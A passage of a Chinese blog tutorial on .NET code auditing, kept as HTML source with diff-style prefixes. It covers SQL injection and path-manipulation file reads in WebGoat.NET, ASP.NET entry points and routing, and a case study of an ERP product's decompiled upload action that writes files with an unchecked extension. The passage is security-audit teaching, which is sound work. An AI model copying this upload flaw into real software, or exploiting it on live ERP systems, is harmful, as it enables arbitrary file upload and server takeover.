+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009997.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009997.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009997.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009997.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009997.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009997.png-water_print" /></p>
+<p>采取参数拼接的方式，导致SQL注入。</p>
+<p>代码审计关注点：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-batch" data-lang="batch"><span class="line"><span class="cl">SQL语句拼接处
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="44-任意文件读取下载">4.4. 任意文件读取/下载</h2>
+<p>/WebGoat/Content/PathManipulation.aspx.cs</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009483.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009483.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009483.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009483.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009483.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009483.png-water_print" /></p>
+<p>33行filename可控，跟进 ResponseFile 函数：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009201.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009201.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009201.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009201.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009201.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009201.png-water_print" /></p>
+<p>未对文件路径进行过滤，直接读取文件</p>
+<p>将读取的文件流写入到HTTP Response中，造成任意文件读：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009338.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009338.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009338.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009338.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009338.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301009338.png-water_print" /></p>
+<p>代码审计关注点：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-batch" data-lang="batch"><span class="line"><span class="cl">File 对象的 OpenText 和 OpenRead 方法
+</span></span><span class="line"><span class="cl">FileStream 对象的 FileMode.Open 和 FileMode.Read
+</span></span><span class="line"><span class="cl">Response.WriteFile 常用于文件下载
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="5-查找程序入口点">5. 查找程序入口点</h1>
+<p>在 .NET Web 项目中，入口点是程序开始执行的地方，确定了应用程序的初始化过程。入口点会因项目类型的不同而有所不同，以下是一些常见的 .NET Web 项目类型及其入口点的概述：</p>
+<h2 id="aspnet-core-项目"><strong>ASP.NET Core 项目</strong></h2>
+<p>ASP.NET Core 项目的入口点通常在 <code>Program.cs</code> 文件中。该文件包含 <code>Main</code> 方法，这是应用程序的实际入口。</p>
+<p>示例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">Program</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">CreateHostBuilder</span><span class="p">(</span><span class="n">args</span><span class="p">).</span><span class="n">Build</span><span class="p">().</span><span class="n">Run</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">IHostBuilder</span> <span class="n">CreateHostBuilder</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">=&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Host</span><span class="p">.</span><span class="n">CreateDefaultBuilder</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">.</span><span class="n">ConfigureWebHostDefaults</span><span class="p">(</span><span class="n">webBuilder</span> <span class="p">=&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">webBuilder</span><span class="p">.</span><span class="n">UseStartup</span><span class="p">&lt;</span><span class="n">Startup</span><span class="p">&gt;();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><strong><code>Main</code></strong>** 方法**：应用程序从这里开始执行。<code>CreateHostBuilder</code> 方法用于创建和配置应用程序的主机。</li>
+<li><strong><code>Startup</code></strong>** 类**：指定在启动过程中要配置应用程序服务和中间件的类。</li>
+</ul>
+<h2 id="aspnet-mvc-项目"><strong>ASP.NET MVC 项目</strong></h2>
+<p>在 ASP.NET MVC 项目中，入口点位于 <code>Global.asax.cs</code> 文件中，通常是 <code>Application_Start</code> 方法。</p>
+<p>示例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">MvcApplication</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">HttpApplication</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="k">void</span> <span class="n">Application_Start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">AreaRegistration</span><span class="p">.</span><span class="n">RegisterAllAreas</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FilterConfig</span><span class="p">.</span><span class="n">RegisterGlobalFilters</span><span class="p">(</span><span class="n">GlobalFilters</span><span class="p">.</span><span class="n">Filters</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">RouteConfig</span><span class="p">.</span><span class="n">RegisterRoutes</span><span class="p">(</span><span class="n">RouteTable</span><span class="p">.</span><span class="n">Routes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BundleConfig</span><span class="p">.</span><span class="n">RegisterBundles</span><span class="p">(</span><span class="n">BundleTable</span><span class="p">.</span><span class="n">Bundles</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><strong><code>Application_Start</code></strong>** 方法**：这是 MVC 应用程序的入口点，当应用程序启动时，ASP.NET 会调用这个方法，用于配置路由、过滤器、捆绑包等。</li>
+</ul>
+<h2 id="aspnet-web-forms-项目"><strong>ASP.NET Web Forms 项目</strong></h2>
+<p>ASP.NET Web Forms 项目的入口点也在 <code>Global.asax.cs</code> 文件中，同样使用 <code>Application_Start</code> 方法进行初始化。</p>
+<p>示例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">Global</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">HttpApplication</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="k">void</span> <span class="n">Application_Start</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 应用程序启动时的配置代码</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="6-查找路由">6. 查找路由</h1>
+<p>在 .NET Web 项目中，路由定义了 URL 请求如何映射到特定的控制器和操作方法（或者处理程序）。当确定了程序入口点，以及存在风险的不安全函数后，如何访问到存在漏洞的页面呢？Web Forms 项目很简单，直接访问对应的 <code>xxx.aspx</code> 即可，其它架构下就需要寻找其路由定义。</p>
+<h2 id="61-aspnet-core-项目">6.1. ASP.NET Core 项目</h2>
+<p>ASP.NET Core 使用 <code>Startup.cs</code> 文件中的 <code>Configure</code> 方法来配置路由。通常你会看到类似如下的代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">void</span> <span class="n">Configure</span><span class="p">(</span><span class="n">IApplicationBuilder</span> <span class="n">app</span><span class="p">,</span> <span class="n">IHostingEnvironment</span> <span class="n">env</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="p">.</span><span class="n">UseRouting</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="p">.</span><span class="n">UseEndpoints</span><span class="p">(</span><span class="n">endpoints</span> <span class="p">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">endpoints</span><span class="p">.</span><span class="n">MapControllerRoute</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">name</span><span class="p">:</span> <span class="s">&#34;default&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pattern</span><span class="p">:</span> <span class="s">&#34;{controller=Home}/{action=Index}/{id?}&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在这里，<code>MapControllerRoute</code> 方法定义了默认的路由模式，你可以在这个 <code>UseEndpoints</code> 方法中查看和定义项目的所有路由。</p>
+<h2 id="62-aspnet-mvc-项目">6.2. ASP.NET MVC 项目</h2>
+<p>在 ASP.NET MVC 项目中，路由通常配置在 <code>RouteConfig.cs</code> 文件中，该文件位于 <code>App_Start</code> 文件夹下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">RouteConfig</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">RegisterRoutes</span><span class="p">(</span><span class="n">RouteCollection</span> <span class="n">routes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">routes</span><span class="p">.</span><span class="n">IgnoreRoute</span><span class="p">(</span><span class="s">&#34;{resource}.axd/{*pathInfo}&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">routes</span><span class="p">.</span><span class="n">MapRoute</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">name</span><span class="p">:</span> <span class="s">&#34;Default&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">url</span><span class="p">:</span> <span class="s">&#34;{controller}/{action}/{id}&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">defaults</span><span class="p">:</span> <span class="k">new</span> <span class="p">{</span> <span class="n">controller</span> <span class="p">=</span> <span class="s">&#34;Home&#34;</span><span class="p">,</span> <span class="n">action</span> <span class="p">=</span> <span class="s">&#34;Index&#34;</span><span class="p">,</span> <span class="n">id</span> <span class="p">=</span> <span class="n">UrlParameter</span><span class="p">.</span><span class="n">Optional</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="7-实战某erp项目">7. 实战某ERP项目</h1>
+<p>这是一套典型的MVC架构，采取预编译形式，DLL 文件均放置在 bin 目录下：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010297.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010297.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010297.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010297.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010297.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010297.png-water_print" /></p>
+<p>首先拿到项目源码时，先关注如下几个文件：</p>
+<p><code>Global.asax</code>：用于处理应用程序级别的事件，例如应用程序启动（Application_Start）、会话启动（Session_Start）、应用程序错误（Application_Error）等。</p>
+<p><code>Web.config</code>：ASP.NET 应用程序的主要配置文件，用于定义应用程序的配置设置，例如数据库连接字符串、身份验证方式、自定义错误页面等。</p>
+<p>其中 <code>Global.asax</code> 定义了程序入口点在 <code>TraderXX.MvcApplication</code>类中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010038.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010038.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010038.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010038.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010038.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010038.png-water_print" /></p>
+<p>一般来说，DLL 文件名会对应上面 class的名称（或相近），在 bin 下找到对应的 DLL 文件：<code>TraderXX.dll</code>，拖入ILSpy进行反编译：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010235.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010235.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010235.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010235.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010235.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010235.png-water_print" /></p>
+<p>寻找 <code>MvcApplication</code>，在里面定义了一些基础路由：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010957.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010957.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010957.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010957.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010957.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010957.png-water_print" /></p>
+<p>然后寻找存在风险的函数，这里以文件上传为例，搜索 <code>WriteAllBytes</code> 关键字：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010825.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010825.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010825.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010825.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010825.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301010825.png-water_print" /></p>
+<p>搜索到 <code>EmailController</code> 下定义了 <code>UploadEmailAttr</code> action，其中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="na">[ValidateInput(false)]</span>
+</span></span><span class="line"><span class="cl"><span class="na">[AcceptVerbs(HttpVerbs.Post)]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>[ValidateInput(false)]</strong>：禁用请求输入验证。这意味着方法不会验证输入数据是否包含潜在的危险内容（例如 HTML 或脚本）。这通常在处理 HTML 或富文本编辑器数据时使用，但也可能会带来安全风险（如 XSS 攻击），因此需要谨慎使用。</p>
+<p><strong>[AcceptVerbs(HttpVerbs.Post)]</strong>：指定该方法只接受 HTTP POST 请求。这表明此方法仅在处理通过 POST 方法发送的请求时会被调用。</p>
+<p>如下这种，则是需要身份认证后才可使用的 Action：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301011537.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301011537.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301011537.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301011537.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301011537.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301011537.png-water_print" /></p>
+<p>这一块有点类似于 Java 的注解，定义一些全局属性。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="n">Stream</span> <span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BufferedStream</span><span class="p">(</span><span class="k">base</span><span class="p">.</span><span class="n">Request</span><span class="p">.</span><span class="n">InputStream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="n">stream</span><span class="p">.</span><span class="n">Length</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="n">stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">string</span> <span class="n">joinfWebFileRootPath</span> <span class="p">=</span> <span class="k">base</span><span class="p">.</span><span class="n">JoinfWebFileRootPath</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">string</span> <span class="n">text</span> <span class="p">=</span> <span class="n">joinfWebFileRootPath</span> <span class="p">+</span> <span class="s">&#34;temp\\emailatta\\&#34;</span> <span class="p">+</span> <span class="n">DateTime</span><span class="p">.</span><span class="n">Now</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="s">&#34;yyyyMM&#34;</span><span class="p">)</span> <span class="p">+</span> <span class="s">&#34;\\&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">stream</span> <span class="p">!=</span> <span class="kc">null</span> <span class="p">&amp;&amp;</span> <span class="n">stream</span><span class="p">.</span><span class="n">Length</span> <span class="p">&gt;</span> <span class="m">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(!</span><span class="n">Directory</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="n">text</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Directory</span><span class="p">.</span><span class="n">CreateDirectory</span><span class="p">(</span><span class="n">text</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">string</span> <span class="n">text2</span> <span class="p">=</span> <span class="n">CreateGUID</span><span class="p">(</span><span class="n">v_hasdate</span><span class="p">:</span> <span class="kc">true</span><span class="p">)</span> <span class="p">+</span> <span class="k">base</span><span class="p">.</span><span class="n">Request</span><span class="p">[</span><span class="s">&#34;name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">string</span> <span class="n">text3</span> <span class="p">=</span> <span class="n">text</span> <span class="p">+</span> <span class="n">text2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">string</span> <span class="n">text4</span> <span class="p">=</span> <span class="n">text3</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="k">base</span><span class="p">.</span><span class="n">JoinfWebFileRootPath</span><span class="p">,</span> <span class="k">base</span><span class="p">.</span><span class="n">JoinfWebFileRootUrl</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;\\&#34;</span><span class="p">,</span> <span class="s">&#34;/&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">string</span> <span class="n">text5</span> <span class="p">=</span> <span class="s">&#34;0&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">text2</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">EndsWith</span><span class="p">(</span><span class="s">&#34;.jpg&#34;</span><span class="p">)</span> <span class="p">||</span> <span class="n">text2</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">EndsWith</span><span class="p">(</span><span class="s">&#34;.png&#34;</span><span class="p">)</span> <span class="p">||</span> <span class="n">text2</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">EndsWith</span><span class="p">(</span><span class="s">&#34;.jpeg&#34;</span><span class="p">)</span> <span class="p">||</span> <span class="n">text2</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">EndsWith</span><span class="p">(</span><span class="s">&#34;.gif&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">text5</span> <span class="p">=</span> <span class="s">&#34;1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">File</span><span class="p">.</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="n">text3</span><span class="p">,</span> <span class="n">array</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="s">&#34;1|&#34;</span> <span class="p">+</span> <span class="n">text3</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="n">joinfWebFileRootPath</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">)</span> <span class="p">+</span> <span class="s">&#34;|&#34;</span> <span class="p">+</span> <span class="n">text4</span> <span class="p">+</span> <span class="s">&#34;|&#34;</span> <span class="p">+</span> <span class="n">text2</span> <span class="p">+</span> <span class="s">&#34;|&#34;</span> <span class="p">+</span> <span class="n">text5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来的函数逻辑是从 HTTP Body 中读取内容，读取 HTTP name 参数作为文件后缀，虽然检测了文件后缀的内容，但是并未做拦截处理，最终利用<code>System.IO.File.WriteAllBytes</code>直接写入到系统中，实现任意文件上传。</p>
+<p>接下来就是寻找具体的路由定义了，由于在全局路由处并未定义具体的功能路由，因此搜索相关关键字，找到区域路由的定义：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301011041.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301011041.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301011041.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301011041.png-water_print 2x"
